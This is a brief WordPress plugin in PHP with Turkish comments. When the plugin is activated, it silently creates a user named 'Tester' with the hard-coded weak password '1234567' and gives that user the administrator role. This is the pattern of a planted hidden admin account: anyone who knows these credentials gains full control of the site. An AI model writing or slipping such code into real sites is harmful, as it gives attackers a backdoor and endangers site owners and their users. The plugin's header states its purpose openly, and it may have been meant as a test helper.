/**
 * Plugin Name: My Custom Plugin
 * Description: Yeni bir kullanıcı oluşturur ve yönetici rolüne atar.
 * Version: 1.0
 */

// Eklenti etkinleştirildiğinde çalışacak işlev
register_activation_hook(__FILE__, 'my_custom_plugin_activation');

function my_custom_plugin_activation() {
    // Yeni kullanıcı bilgileri
    $username = 'Tester';
    $password = '1234567';

    // Yeni kullanıcıyı oluşturma
    $user_id = wp_create_user($username, $password);

    // Yeni kullanıcıyı yönetici yapma
    $user = new WP_User($user_id);
    $user->set_role('administrator');
}
